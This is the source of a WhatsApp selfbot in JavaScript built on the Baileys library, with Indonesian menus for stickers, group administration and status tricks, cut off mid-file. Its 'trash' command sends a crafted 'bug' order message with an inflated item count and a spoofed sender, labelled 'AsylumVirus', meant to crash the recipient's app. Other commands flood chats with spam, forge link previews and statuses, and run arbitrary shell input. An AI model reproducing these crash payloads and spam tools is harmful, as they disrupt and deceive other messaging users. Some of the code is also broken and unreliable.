/*
BY AichZZ
*/
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
} = require("@adiwajshing/baileys");
const moment = require("moment-timezone");
const fs = require("fs");
const { exec } = require('child_process');
const ichi = require('./whatsapp/message.js');
const speed = require('performance-now');
const ffmpeg = require('fluent-ffmpeg');
const conn = require('./whatsapp/connect');
const { color } = require('./lib/color');
const mess = JSON.parse(fs.readFileSync('./whatsapp/mess.json'));
const axios = require('axios');
const Exif = require('./lib/exif');
const { uptotele, uptonaufal } = require('./lib/uploadimage')
const exif = new Exif();
const fetch = require('node-fetch');
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const ms = require('parse-ms')
const toMs = require('ms')
const getBuffer = require('buffer')
const addafk = (from) => {
    const obj = { id: from, expired: Date.now() + toMs('2m') }
    afk.push(obj)
    fs.writeFileSync('./lib/off.json', JSON.stringify(afk))
}


const cekafk = (_dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            _dir.splice(position, 1)
            fs.writeFileSync('./lib/off.json', JSON.stringify(_dir))
        }
    }, 1000)
}


const isAfk = (idi) => {
    let status = false
    Object.keys(afk).forEach((i) => {
        if (afk[i].id === idi) {
            status = true
        }
    })
    return status
}

const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

conn.connect()
const ichh = conn.ichh
offline = false
fake = '[ Your Imperfection ]'
fakeimage = fs.readFileSync(`./media/ichi.jpeg`)
prefix = '∆'
public = false
waktu = '-'
alasan = '-'
xteam = 'Masukkan Apikeymu'
ichh.on('message-new', async(ich) => {
    try {
        if (!ich.message) return
		if (ich.key && ich.key.remoteJid == 'status@broadcast') return

        global.prefix
		const content = JSON.stringify(ich.message)
		const from = ich.key.remoteJid
		const type = Object.keys(ich.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		body = (type === 'conversation' && ich.message.conversation.startsWith(prefix)) ? ich.message.conversation : (type == 'imageMessage') && ich.message.imageMessage.caption.startsWith(prefix) ? ich.message.imageMessage.caption : (type == 'videoMessage') && ich.message.videoMessage.caption.startsWith(prefix) ? ich.message.videoMessage.caption : (type == 'extendedTextMessage') && ich.message.extendedTextMessage.text.startsWith(prefix) ? ich.message.extendedTextMessage.text : ''
		chats = (type === 'conversation') ? ich.message.conversation : (type === 'extendedTextMessage') ? ich.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = chats.slice(command.length + 2, chats.length)
		

        const botNumber = ichh.user.jid
		const isGroup = from.endsWith('@g.us')
		const sender = ich.key.fromMe ? ichh.user.jid : isGroup ? ich.participant : ich.key.remoteJid
		const totalchat = await ichh.chats.all()
		const groupMetadata = isGroup ? await ichh.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupAdmins = isGroup ? ichi.getGroupAdmins(groupMembers) : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const itsMe = sender === botNumber ? true : false
		const isUrl = (url) => {
			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}

        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		
		 cekafk(afk)
            if (!ich.key.remoteJid.endsWith('@g.us') && offline){
            if (!ich.key.fromMe){
            if (isAfk(ich.key.remoteJid)) return
            addafk(ich.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            ichh.sendMessage(ich.key.remoteJid,`@6285755495437 Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.extendedText,{contextInfo:{ mentionedJid: [`6285755495437@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./media/ichi.jpeg')}}}})
            }
            }   
        if (ich.key.remoteJid.endsWith('@g.us') && offline) {
        if (!ich.key.fromMe){
        if (ich.message.extendedTextMessage != undefined){
        if (ich.message.extendedTextMessage.contextInfo != undefined){
        if (ich.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of ich.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `6285755495437@s.whatsapp.net`){
        if (isAfk(ich.key.remoteJid)) return
        addafk(ich.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        ichh.sendMessage(mek.key.remoteJid,`@6285755495437 Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`6285755495437@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./media/ichi.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }


		if (itsMe){
			if (chats.toLowerCase() === `${prefix}self`){
				public = false
				ichi.sendFakeStatus(from, `Sukses`, `Status: SELF`)
			}
			if (chats.toLowerCase() === 'status'){
				ichi.sendFakeStatus(from, `STATUS: ${public ? 'PUBLIC' : 'SELF'}`)
			}
		}
		if (!public){
			if (!ich.key.fromMe) return
		}

		
		if (isCmd && !isGroup) {console.log(color('[CMD]'), color(moment(ich.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`))}
        if (isCmd && isGroup) {console.log(color('[CMD]'), color(moment(ich.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(ichh.user.name), 'in', color(groupName))}
        switch (command) {
			case 'menu': case 'help':
				textnya = `Hitung mundur ramdhan
	=> 

No prefix
=> status
=> > <eval>

=> ${prefix}sticker
=> ${prefix}swm nama | author
=> ${prefix}takestick namma | author
=> ${prefix}colong <reply stiker>
=> ${prefix}self
=> ${prefix}public
=> ${prefix}hidetag
=> ${prefix}runtime
=> ${prefix}speed
=> ${prefix}mystat
=> ${prefix}kontak
=> ${prefix}hidetag
=> ${prefix}term
=> ${prefix}setreply
=> ${prefix}setprefix
=> ${prefix}setname
=> ${prefix}setbio
=> ${prefix}fdeface
=> ${prefix}fakethumbnail
=> ${prefix}setthumb
=> ${prefix}getpic
=> ${prefix}stickertag
=> ${prefix}imgtag
=> ${prefix}kontaktag
=> ${prefix}tahta teks
=> ${prefix}pubg teks1|teks2
=> ${prefix}promote
=> ${prefix}demote
=> ${prefix}kick
=> ${prefix}add
=> ${prefix}creategrup nama|tag
=> ${prefix}getgrup
=> ${prefix}upstatus text
=> ${prefix}tovideo
=> ${prefix}togif
=> ${prefix}spam teks|jumlah spam
=> ${prefix}imgtourl

「 *NightMare* 」`
				ichi.sendFakeStatusWithImg(from, fakeimage, textnya, fake)
				break
            case 'test':
                ichi.sendText(from, 'oke')
				break
	case 'play':
					
						dataa = await fetch(`https://api.xteam.xyz/dl/play?lagu=${body.slice(6)}&APIKEY=${xteam}`, {method: 'get'})
            data = dataa.json()
						teks = '-「 *Play Music From Youtubes* 」-\n'
						
							teks += `\n- *Judul* : ${data.judul}\n- *Size* : ${data.size}\n\n-「 *I C H I* 」-`
						thumb = await getBuffer(data.thumbnail)
						ichi.sendFakeToko(from, mess.wait, teks)
						ichh.sendMessage(from, thumb, image, {quoted: ich, caption: teks})
						buffer = await getBuffer(data.url)
						ichh.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', filename: `${data.judul}.mp3`, quoted: ich, ptt: true})
						break 
			case 'public':
				public = true
				ichi.sendFakeStatus(from, `Sukses`, fake)
				break
			case 'exif':
				if (args.length < 1) return ichi.reply(from, `Penggunaan ${prefix}exif nama|author`, ich)
				if (!arg.split('|')) return ichi.reply(from, `Penggunaan ${prefix}exif nama|author`, ich)
				exif.create(arg.split('|')[0], arg.split('|')[1])
				ichi.reply(from, 'sukses', ich)
				break
			case 'sticker':
			case 'stiker':
			case 's':
				if (isMedia && !ich.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ich
					const media = await ichh.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								ichi.reply(from, mess.error.api, ich)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return ichi.reply(from, mess.error.api, ich)
									ichi.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ich)
									fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
				} else if ((isMedia && ich.message.videoMessage.fileLength < 10000000 || isQuotedVideo && ich.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ich
					const media = await ichh.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					ichi.reply(from, mess.wait, ich)
						await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								ichi.reply(from, mess.error.api, ich)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return ichi.reply(from, mess.error.api, ich)
									ichi.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ich)
									fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
				} else {
					ichi.reply(from, `Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`, ich)
				}
				break
			case 'swm':
			case 'stickerwm':
				if (isMedia && !ich.message.videoMessage || isQuotedImage) {
					if (!arg.includes('|')) return ichi.reply(from, `Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`, ich)
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ich
					const media = await ichh.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					const packname1 = arg.split('|')[0]
					const author1 = arg.split('|')[1]
					exif.create(packname1, author1, `stickwm_${sender}`)
					await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								ichi.reply(from, mess.error.api, ich)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return ichi.reply(from, mess.error.api, ich)
									ichi.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ich)
									fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
									fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
				} else if ((isMedia && ich.message.videoMessage.fileLength < 10000000 || isQuotedVideo && ich.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
					if (!arg.includes('|')) return ichi.reply(from, `Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`, ich)
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : ich
					const media = await ichh.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					const packname1 = arg.split('|')[0]
					const author1 = arg.split('|')[1]
					exif.create(packname1, author1, `stickwm_${sender}`)
					ichi.reply(from, mess.wait, ich)
						await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								ichi.reply(from, mess.error.api, ich)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return ichi.reply(from, mess.error.api, ich)
									ichi.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ich)									
									fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
									fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
				} else {
					ichi.reply(from, `Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`, id)
				}
				break
			case 'takestick':
				if (!isQuotedSticker) return ichi.reply(from, `Reply sticker dengan caption *${prefix}takestick nama|author*`, ich)
				const pembawm = body.slice(11)
				if (!pembawm.includes('|')) return ichi.reply(from, `Reply sticker dengan caption *${prefix}takestick nama|author*`, ich)
				const encmedia = JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				const media = await ichh.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
				const packname = pembawm.split('|')[0]
				const author = pembawm.split('|')[1]
				exif.create(packname, author, `takestick_${sender}`)
				exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
					if (error) return ichi.reply(from, mess.error.api, ich)
					ichi.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ich)
					fs.unlinkSync(media)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
			case 'colong':
				if (!isQuotedSticker) return ichi.reply(from, `Reply sticker dengan caption *${prefix}colong*`, ich)
				const encmediia = JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				const meidia = await ichh.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
				exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
					if (error) return ichi.reply(from, mess.error.api, ich)
					ichi.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ich)
					fs.unlinkSync(meidia)
				})
				break
			case 'hidetag':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}hidetag teks`, ich)
				ichi.hideTag(from, arg)
				break
			case 'runtime':
				run = process.uptime()
				let text = ichi.runtime(run)
				ichi.sendFakeStatus(from, text, `Runtime bro`)
				break
			case 'speed': case 'ping':
				let timestamp = speed();
				let latensi = speed() - timestamp
				ichi.sendFakeStatus(from, `Speed: ${latensi.toFixed(4)}second`, fake)
				break
			case 'mystat': case 'mystatus':
				let i = []
				let giid = []
				for (mem of totalchat){
					i.push(mem.jid)
				}
				for (id of i){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                let timestampi = speed();
				let latensii = speed() - timestampi
                const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = ichh.user.phone
                anu = process.uptime()
                teskny = `*V. Whatsapp :* ${wa_version}
*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*MCC :* ${mcc}
*MNC :* ${mnc}
*Versi OS :* ${os_version}
*Merk HP :* ${device_manufacturer}
*Versi HP :* ${device_model}

*Group Chat :* ${giid.length}
*Personal Chat :* ${totalchat.length - giid.length}
*Total Chat :* ${totalchat.length}
*Speed :* ${latensii.toFixed(4)} Second
*Runtime :* ${ichi.runtime(anu)}`
				ichi.sendFakeStatus(from, teskny, fake)
				break
			case 'kontak':
				argz = arg.split('|')
				if (!argz) return ichi.reply(from, `Penggunaan ${prefix}kontak @tag atau nomor|nama`, ich)
				if (ich.message.extendedTextMessage != undefined){
                    mentioned = ich.message.extendedTextMessage.contextInfo.mentionedJid
					ichi.sendKontak(from, mentioned[0].split('@')[0], argz[1])
				} else {
					ichi.sendKontak(from, argz[0], argz[1])
				}
				break
			case 'hayoloh':
				ichh.toggleDisappearingMessages(from, 0)
			break
case 'trash':
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
ichh.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
thumbnail: fs.readFileSync('./media/ichi.jpeg'),
    itemCount: 999999999, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
ichh.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
async function attack(targett){
bug(targett)
await sleep(3000)
troli(targett)
await sleep(3000)
bug(targett)
}

attack(ich.key.remoteJid)
break
			case 'term':
				if (!arg) return
				exec(arg, (err, stdout) => {
					if (err) return ichi.sendFakeStatus(from, err, fake)
					if (stdout) ichi.sendFakeStatus(from, stdout, fake)
				})
				break
			case 'setreply':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}setreply teks`, ich)
				fake = arg
				ichi.sendFakeStatus(from, `Sukses`, fake)
				break
			case 'setprefix':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}setprefix prefix`, ich)
				prefix = arg
				ichi.sendFakeStatus(from, `Prefix berhasil diubah menjadi ${prefix}`, fake)
				break
			case 'setname':
				if (!arg) return ichi.reply(from, 'masukkan nama', ich)
				ichi.setName(arg)
				.then((res) => ichi.sendFakeStatus(from, JSON.stringify(res), fake))
				.catch((err) => ichi.sendFakeStatus(from, JSON.stringify(err), fake))
				break
			case 'setbio':
				if (!arg) return ichi.reply(from, 'masukkan bio', ich)
				ichi.setBio(arg)
				.then((res) => ichi.sendFakeStatus(from, JSON.stringify(res), fake))
				.catch((err) => ichi.sendFakeStatus(from, JSON.stringify(err), fake))
				break
			case 'fdeface': case 'hack':
				if (!arg) return ichi.reply(from, `Penggunaaan ${prefix}fdeface url|title|desc|url\n\nContoh : ${prefix}fdeface https://google.com|Self Bot|By aichzz|https://ichi.com`, ich)
				argz = arg.split("|")
				if (!argz) return ichi.reply(from, `Penggunaaan ${prefix}fdeface url|title|desc|url\n\nContoh : ${prefix}fdeface https://google.com|Self Bot|By aichzz|https://ichi.com`, ich)
				if ((isMedia && !ich.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ich
					let media = await ichh.downloadMediaMessage(encmedia)
					ichi.sendFakeThumb(from, argz[0], argz[1], argz[2], argz[3], media)
				} else {
					ichi.sendFakeThumb(from, argz[0], argz[1], argz[2], argz[3])
				}
				break
			case 'fakethumbnail': case 'fthumbnail': case 'fakethumb':
				if ((isMedia && !ich.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ich
					let media = await ichh.downloadMediaMessage(encmedia)
					ichi.sendFakeImg(from, media, arg, fakeimage, ich)
				} else {
					ichi.reply(from, `Kirim gambar atau reply dengan caption ${prefix}fakethumb caption`, ich)
				}
				break
			case 'setthumb':
				boij = JSON.parse(JSON.stringify(ich).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await ichh.downloadMediaMessage(boij)
				fs.writeFileSync(`./media/ichi.jpeg`, delb)
				fakeimage = fs.readFileSync(`./media/ichi.jpeg`)
				ichi.sendFakeStatus(from, `Sukses`, fake)
				break
			case 'getpic':
				if (ich.message.extendedTextMessage != undefined){
					mentioned = ich.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await ichh.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					thumb = await ichi.getBuffer(pic)
					ichi.sendImage(from, thumb)
				}
				break
			case 'imgtag':
				if ((isMedia && !ich.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ich
					let media = await ichh.downloadMediaMessage(encmedia)
					ichi.hideTagImg(from, media)
				} else {
					ichi.reply(from, `Kirim gambar atau reply dengan caption ${prefix}imgtag caption`, ich)
				}
				break
			case 'sticktag': case 'stickertag':
				if (!isQuotedSticker) return ichi.reply(from, `Reply sticker dengan caption *${prefix}stickertag*`, ich)
				let encmediai = JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				let mediai = await ichh.downloadMediaMessage(encmediai)
				ichi.hideTagSticker(from, mediai)
				break
			case 'kontaktag':
				argz = arg.split('|')
				if (!argz) return ichi.reply(from, `Penggunaan ${prefix}kontak @tag atau nomor|nama`, ich)
				if (ich.message.extendedTextMessage != undefined){
                    mentioned = ich.message.extendedTextMessage.contextInfo.mentionedJid
					ichi.hideTagKontak(from, mentioned[0].split('@')[0], argz[1])
				} else {
					ichi.hideTagKontak(from, argz[0], argz[1])
				}
				break
			case 'tahta':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}tahta teks`, ich)
				ichi.sendMediaURL(from, `https://api.zeks.xyz/api/hartatahta?text=${arg}&apikey=apivinz`)
				break
			case 'pubg':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}pubg teks1|teks2`, ich)
				argz = arg.split("|")
				if (!argz) return ichi.reply(from, `Penggunaan ${prefix}pubg teks1|teks2`, ich)
				axios.get(`https://xinzbot-api.herokuapp.com/api/textmaker/game?text=${argz[0]}&text2=${argz[1]}&theme=pubg&apikey=XinzBot`)
				.then((res) => ichi.sendMediaURL(from, res.data.result.url))
				.catch((err) => {
					console.log(err)
					ichi.reply(from, mess.error.api, ich)
				})
				break
			case 'togif':
				if (!isQuotedSticker) return reply(from, 'Reply stiker nya', ich)
				if (ich.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
					const encmedia = JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					const media = await ichh.downloadAndSaveMediaMessage(encmedia)
					const uploadn = await uptonaufal(media, Date.now() + '.webp')
					const anjj = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${uploadn.result.image}`)
					thumb = await ichi.getBuffer(anjj.data.result)
					ichi.sendGif(from, thumb)
					fs.unlinkSync(media)
				} else {
					ichi.reply(from, `Harus sticker bergerak`, ich)
				}
				break
			case 'toimg': case 'tovideo':
				if (!isQuotedSticker) return ichi.reply(from, 'Reply stiker nya', ich)
				if (ich.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
					const encmedia = JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					const media = await ichh.downloadAndSaveMediaMessage(encmedia)
					const uploadn = await uptonaufal(media, Date.now() + '.webp')
					const anjj = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${uploadn.result.image}`)
					await ichi.sendMediaURL(from, anjj.data.result, 'Nih')
					fs.unlinkSync(media)
				} else {
					const encmedia = JSON.parse(JSON.stringify(ich).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					const media = await ichh.downloadAndSaveMediaMessage(encmedia)
					ran = ichi.getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) {
							ichi.reply(from, `gagal`, ich)
							fs.unlinkSync(ran)
						} else {
							buffer = fs.readFileSync(ran)
							ichi.sendImage(from, buffer, 'nih', ich)
							fs.unlinkSync(ran)
						}
					})
				}
				break
			case 'shutdown':
				await ichi.FakeTokoForwarded(from, `Bye...`, fake)
				await ichi.sleep(5000)
				ichh.close()
				break
			case 'spam':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}spam teks|jumlahspam`, ich)
				argz = arg.split("|")
				if (!argz) return ichi.reply(from, `Penggunaan ${prefix}spam teks|jumlah`, ich)
				if (isNaN(argz[1])) return ichi.reply(from, `harus berupa angka`, ich)
				for (let i = 0; i < argz[1]; i++){
					ichi.sendText(from, argz[0])
				}
				break
			case 'promote':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}promote @tag atau nomor`, ich)
				if (ich.message.extendedTextMessage != undefined){
                    mentioned = ich.message.extendedTextMessage.contextInfo.mentionedJid
					await ichi.FakeTokoForwarded(from, `sukses`, fake)
					ichi.promote(from, mentioned)
				} else {
					await ichi.FakeTokoForwarded(from, `sukses`, fake)
					ichi.promote(from, [args[0] + '@s.whatsapp.net'])
				}
				break
			case 'demote':
				if (!arg) return ichi.reply(from, `Penggunaan ${prefix}demote @tag atau nomor`, ich)
				if (ich.message.extendedTextMessage != undefined){
                    mentioned = ich.message.extendedTextMessage.contextInfo.mentionedJid
					await ichi.FakeTokoForwarded(from, `sukses`, fake)
					ichi.demote(from, mentioned)
				} else {
					await ichi.FakeTokoForwarded(from, `sukses`, fake)
					ichi.demote(from, [args[0] + '@s.whatsapp.net'])
				}
				break 
				 case 'on':
            if (!ich.key.fromMe) return 
            offline = false
            ichi.sendFakeToko(from, ' ``ANDA TELAH ONLINE``` ', 'ONLINE')
            break       
    case 'off':
            if (!ich.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
